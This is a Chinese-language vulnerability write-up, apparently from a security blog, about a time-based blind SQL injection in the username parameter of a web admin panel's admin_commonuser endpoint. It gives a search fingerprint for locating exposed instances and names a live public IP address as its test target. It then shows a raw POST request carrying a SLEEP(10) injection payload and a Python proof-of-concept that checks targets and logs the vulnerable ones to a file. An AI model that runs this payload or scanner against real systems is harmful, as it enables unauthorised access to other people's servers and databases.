## 一、资产搜索

```
body="admin.php?controller=admin_index&action=get_user_login_fristauth"
```

## 二、测试网站

```
https://171.223.114.196:1443
```

## 三、验证漏洞

构造的请求包

```
POST /admin.php?controller=admin_commonuser HTTP/1.1
Host: 171.223.114.196:1443
User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.114 Safari/537.36
Connection: close
Content-Length: 79
Accept: */*
Content-Type: application/x-www-form-urlencoded
Accept-Encoding: gzip

username=admin' AND (SELECT 6999 FROM (SELECT(SLEEP(10)))ptGN) AND 'AAdm'='AAdm
```

![image-20240903113139797](https://imagescf.oss-cn-beijing.aliyuncs.com/img/image-20240903113139797.png)

## 四、POC

```
def poc(target):
    payload = "/admin.php?controller=admin_commonuser"
    data = "username=admin' AND (SELECT 6999 FROM (SELECT(SLEEP(10)))ptGN) AND 'AAdm'='AAdm"
    headers = {
        "User-Agent": "Mozilla/5.0(WindowsNT10.0;WOW64)AppleWebKit/537.36(KHTML,likeGecko)Chrome/89.0.4389.114Safari/537.36",
        "Connection": "close",
        "Content-Length": "79",
        "Accept": "*/*",
        "Content-Type": "application/x-www-form-urlencoded",
        "Accept-Encoding": "gzip"
    }
    res1 = requests.get(url=target, verify=False,timeout=5)   # 0.3
    try:
        if res1.status_code == 200:
            res2 = requests.post(url=target,verify=False)  # 10.3
            res3 = requests.post(url=target+payload, data=data, headers=headers, verify=False)
            time2 = res2.elapsed.total_seconds()
            time3 = res3.elapsed.total_seconds()
            if time3-time2 >= 9 and time3 > 10:  ## 这里判断只要res2响应超过5秒，就判断存在漏洞，因为正常响应时间不超过1秒
                with open("result.txt", "a", encoding="utf-8") as f:
                    f.write(f"该{target}存在延时注入漏洞{time3 - time2}\n")
                print(f"该{target}存在延时注入漏洞{time3 - time2}")
            elif time3 < 9:
                print(f"该{target}不存在延时注入漏洞{time3 - time2}")
        else:
            print(f"该{target}存在问题，请手动测试")
    except Exception as e:
        print(e)
```

## 五、测试结果

![image-20240903144822062](https://imagescf.oss-cn-beijing.aliyuncs.com/img/image-20240903144822062.png)

![image-20240903144848659](https://imagescf.oss-cn-beijing.aliyuncs.com/img/image-20240903144848659.png)
